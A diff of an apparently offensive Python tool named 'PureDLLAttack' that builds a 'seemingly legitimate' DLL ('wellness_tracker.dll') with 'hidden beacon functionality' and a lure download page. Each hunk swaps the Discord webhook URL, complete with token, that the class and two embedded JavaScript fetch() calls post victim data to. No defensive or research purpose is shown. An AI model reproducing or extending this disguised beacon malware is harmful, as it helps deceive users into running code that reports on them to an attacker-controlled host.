@@ -10,7 +10,7 @@ import hashlib
 
 class PureDLLAttack:
     def __init__(self):
-        self.webhook_url = "https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN"
+        self.webhook_url = "https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95"
         
     def create_legitimate_dll(self, filename="wellness_tracker.dll"):
         """Create a seemingly legitimate DLL with hidden beacon functionality"""
@@ -174,7 +174,7 @@ class PureDLLAttack:
             link.click();
             
             // Send beacon
-            fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
+            fetch('https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -299,7 +299,7 @@ pause >nul
     <script>
         function downloadApp() {
             // Track download
-            fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
+            fetch('https://discord.com/api/webhooks/1417442947686731856/1UGJsXCLBqIZmb2shm4CjxJhAzZtObsbKtbStAmPg5jKtvbVt9WqRfRkNZ6ymjuiDS95', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
